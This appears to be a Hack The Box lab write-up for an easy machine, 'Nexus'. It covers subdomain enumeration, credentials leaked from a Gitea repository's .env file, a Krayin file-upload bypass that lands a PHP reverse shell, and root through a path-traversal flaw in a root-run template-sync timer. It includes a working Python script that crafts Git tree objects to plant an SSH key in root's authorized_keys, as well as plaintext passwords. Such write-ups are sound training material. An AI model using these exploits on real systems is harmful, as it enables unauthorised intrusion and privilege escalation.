#htb #easy #subdomains #gitea #env-leak #credentials-reuse #krayin #cve-2026-38526 #file-upload #systemd-timers #git #path-traversal

# Enumeration
## Nmap

```bash
[hvidal@fedora] ~/d/h/h/m/n/scan
❯ nmap -p- --open -vvv --min-rate 5000 -n 10.129.234.54 -oG scan 
Discovered open port 22/tcp on 10.129.234.54
Discovered open port 80/tcp on 10.129.234.54
```

Open ports: 22,80

```bash
[hvidal@fedora] ~/d/h/h/m/n/scan
❯ nmap -p 22,80 -sCV 10.129.234.54 -oN portscan.txt -Pn
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nexus.htb/
```

## Subdomains

```bash
[hvidal@fedora] ~/d/h/h/m/n/scan
❯ ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.nexus.htb" -fw 4 -u http://10.129.234.54
git                     [Status: 200, Size: 14472]
billing                 [Status: 302, Size: 390]
```

Add `nexus.htb`, `git.nexus.htb` and `billing.nexus.htb` to `/etc/hosts`.
```bash
[hvidal@fedora] ~/d/h/h/m/n/scan
❯ echo "10.129.234.54 nexus.htb git.nexus.htb billing.nexus.htb" | sudo tee -a /etc/hosts
```

The job posting of `nexus.htb` displays two email addresses.
- `j.matthew@nexus.htb`
- `careers@nexus.htb`

`git.nexus.htb` contains a repository named `krayin-docker-setup` which exposes the `.env` file, where we can find the other subdomain and a password.
```txt
APP_URL=http://billing.nexus.htb
```

Inspecting the commit history reveals  that the database password has been removed.
```txt
DB_PASSWORD=N27xh!!2ucY04
```

## Krayin

The `billing.nexus.htb` subdomain displays a login page which can be accessed using the email address found in `nexus.htb` and the password of the `.env` file.
```txt
User: j.matthew@nexus.htb
Password: N27xh!!2ucY04
```

The **Krayin** dashboard displays the version 2.2.0 which is vulnerable to unrestricted PHP file upload ([CVE-2026-38526](https://github.com/TREXNEGRO/Security-Advisories/blob/main/CVE-2026-38526/poc.md)).

# Exploitation
## Gaining a shell

The vulnerability allows authenticated users to upload arbitrary PHP files by bypassing the file type validation.

Compose a new email in the email page. Then click the attachment button and select a [php reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).
![](mail_panel.png)

Intercept the request with **Burp Suite** and change the `Content-Type` to `image/jpeg` and send the request.
![](burp_shell_upload.png)

Start a listener.
```bash
[hvidal@fedora] ~/d/h/h/m/n/content
❯ nc -lnvp 4444
```

Send a GET request to the uploaded file URL.
```bash
[hvidal@fedora] ~/d/h/h/m/n/content
❯ curl http:\/\/billing.nexus.htb\/storage\/emails\/8\/shell.php
```

## Post-Exploitation

The `.env` file contains plain-text credentials.
```bash
$ cat /var/www/krayin/.env
DB_PASSWORD=y27xb3ha!!74GbR
```

Search for users who can reuse the password.
```bash
$ cat /etc/passwd | grep bash
root:/bin/bash
jones:/home/jones:/bin/bash
git:/home/git:/bin/bash
```

Connect as the user `jones` with the found password.
```bash
[hvidal@fedora] ~/d/h/h/m/n/content
❯ ssh jones@nexus.htb
jones@nexus.htb's password:
```

Read the user flag.
```bash
jones@nexus:~$ cat user.txt
```

# Privilege escalation

## Enumeration

List the `systemd` timers.
```bash
jones@nexus:~$ systemctl list-timers
ACTIVATES
gitea-template-sync.service
```

Inspect the associated service.
```bash
jones@nexus:~$ cat /etc/systemd/system/gitea-template-sync.service
[Unit]
Description=Sync Gitea templates
After=network-online.target

[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
TimeoutStartSec=50s
```

Check the Python script permissions.
```bash
jones@nexus:~$ ls -l /etc/gitea/template-sync.py
-rw-r--r-- 1 git git 4184 May 11 18:47 /etc/gitea/template-sync.py
```

The timer executes a Python script as root which is not writable.

## Exploitation

The Python script enumerates all template repositories in the Gitea application. For each repository, it reads the Git tree and writes the contents of each blob to `/home/git/template-staging/<owner>/<name>`.

The script never sanitizes blob paths before writing them to disk. So if a repository contains tree entries with path traversal components (`../`), files can be written outside the staging directory, for example to `/root/.ssh/authorized_keys`.

However, Git prevents creating tree entries with path traversal components through its normal commands. To bypass this restriction, we must write the crafted Git objects directly to `.git/objects`.

>[!note]- Relevant code
>```python
>result = subprocess.run(
>	GIT + ['ls-tree', '-r', 'HEAD'],
>	cwd=bare_path,
>	capture_output=True, text=True, timeout=10
>) # saves the git tree
>
>parts = line.split('\t', 1) for line in result # separate each part of the tree output
>
> mode, objtype, objhash = parts.split()
>if objtype == 'blob':
>	entries.append((mode, objhash, filepath)) # saves the content of the blobs
>
>for mode, objhash, filepath in entries:
>	target = os.path.join(stage_path, filepath)  # /home/git/template-staging/<owner>/<name>
>
>	cat_result = subprocess.run(
>		GIT + ['cat-file', 'blob', objhash],
>		cwd=bare_path,
>		capture_output=True, timeout=10
>	) # read the file content
>
>	with open(target, 'wb') as f:
>		f.write(cat_result.stdout) # writes the file content in the target path
>```

### Malicious Template Repository

Log in to `http://git.nexus.htb/` with the SSH credentials and create a template repository.
![](template_repo.png)
Create a local repository.
```bash
jones@nexus:/tmp$ mkdir rce && cd rce && git init
```

Create a SSH key for the `jones` user.
```bash
jones@nexus:/tmp$ ssh-keygen -t ed25519 -f /tmp/malicious_key -N ""
```

Create a crafted Git tree object named `../../../../../root/.ssh/authorized_keys` containing jones's SSH public key using the following Python script.
```python
#!/usr/bin/env python3
import hashlib,zlib,os,subprocess,sys,time

def write_obj(data,t):
    h=(f"{t} {len(data)}").encode()+b"\x00"
    s=h+data
    sha=hashlib.sha1(s).hexdigest()
    d=os.path.join(".git","objects",sha[:2])
    os.makedirs(d,exist_ok=True)
    p=os.path.join(d,sha[2:])
    if not os.path.exists(p):
        open(p,"wb").write(zlib.compress(s))
    return sha

def entry(mode,name,sha):
    return(f"{mode} {name}").encode()+b"\x00"+bytes.fromhex(sha)

if not os.path.isdir(".git"):
    print("Run inside git repo");sys.exit(1)

r=subprocess.run(["cat",sys.argv[1]],capture_output=True,text=True)

if r.returncode!=0:
    print("Error reading the public key");sys.exit(1)
key=r.stdout.strip()+"\n"

blob=write_obj(key.encode(),"blob")
readme=write_obj(b"# Template\n","blob")
ssh_t=write_obj(entry("100644","authorized_keys",blob),"tree")
cur=write_obj(entry("40000",".ssh",ssh_t),"tree")
fir=write_obj(entry("40000","root",cur),"tree")

for i in range(4):
    fir=write_obj(entry("40000","..",fir),"tree")

root=write_obj(entry("100644","README.md",readme)+entry("40000","..",fir),"tree")

ts=int(time.time())
c=f"tree {root}\nauthor x <x@x> {ts} +0000\ncommitter x <x@x> {ts} +0000\n\ninit\n"

sha=write_obj(c.encode(),"commit")

os.makedirs(os.path.join(".git","refs","heads"),exist_ok=True)

open(os.path.join(".git","refs","heads","main"),"w").write(sha+"\n")

print("Done")
```

Execute the script.
```bash
jones@nexus:/tmp/rce$ python3 script.py ../malicious_key.pub 
Done
```

Push the crafted commit to the template repository.
```bash
jones@nexus:/tmp/rce$ git remote add origin http://localhost:3000/jones/rce.git

jones@nexus:/tmp/rce$ git push -u origin main --force
Username for 'http://localhost:3000': jones
Password for 'http://jones@localhost:3000': y27xb3ha!!74GbR
```

Wait for the timer to execute and verify the exploit.
```bash
jones@nexus:/tmp/rce$ tail -f /var/log/template-sync.log
[2026-07-12 11:56:48] Template sync starting
[2026-07-12 11:58:48] Syncing template: jones/rce
[2026-07-12 11:58:48]   synced: ../../../../../root/.ssh/authorized_keys
[2026-07-12 11:58:48] Template sync complete
```

Login as root via ssh.
```bash
jones@nexus:/tmp/rce$ ssh -i /tmp/malicious_key root@localhost
```

Read the root flag.
```bash
root@nexus:~$ cat /root/root.txt
```